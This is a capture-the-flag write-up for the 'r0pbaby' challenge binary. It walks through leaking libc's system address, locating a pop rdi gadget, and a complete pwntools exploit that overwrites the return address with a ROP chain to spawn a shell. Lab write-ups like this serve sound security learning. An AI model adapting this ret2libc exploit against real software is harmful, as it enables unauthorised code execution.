# r0pbaby

About this binary

```bash
[*] '/home/ubuntu/Desktop/Pwnable/Write-ups/r0pbaby/r0pbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

This binary has `PIE`, `NX bit`.

About `libc.so.6`

```bash
[*] '/home/ubuntu/Desktop/Pwnable/Write-ups/r0pbaby/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```bash
Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2   
Enter symbol: system
Symbol system: 0x00007F9988E86390
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 4  
1234
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
```

This binary gives libc address, function address, and we can overwrite stack start from `rbp`.

I wrote rop code like this.

```python
rop code
2 > system leak
calc '/bin/sh' address
3 > overwrite ret
```

And this binary has `PIE`, so I found gadget offset from `libc.so.6` using `rp++`. 

```bash
rp++ -f ./libc.so.6 -r 2 | grep "pop rdi"
...
0x0019dba5: pop rdi ; ret  ;  (1 found)
```

After, I got system offset by pwntools.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

lib = ELF('./libc.so.6')
bin = ELF('./r0pbaby')

p = process('./r0pbaby', env={'LD_PRELOAD' : 'libc.so.6'})

system_offset = lib.symbols['system']

binsh_offset = 0x1479c7 # /bin/sh - system
pop_rdi_ret_offset = 0x0019dba5
pop_rdi_ret = pop_rdi_ret_offset - system_offset


p.sendline('2')
p.sendline('system')
p.recvuntil('Symbol system: ')
system_leak = int(p.recvline().split('\n')[0],16)

print 'system_leak: '
print system_leak

binsh = system_leak + binsh_offset

print 'binsh: '
print binsh

payload = 'a' * 8
payload += p64(system_leak + pop_rdi_ret) + p64(binsh) + p64(system_leak)

p.sendline('3')
p.sendline(str(len(payload) + 1))
p.sendline(payload)
p.sendline('4')

p.interactive()
```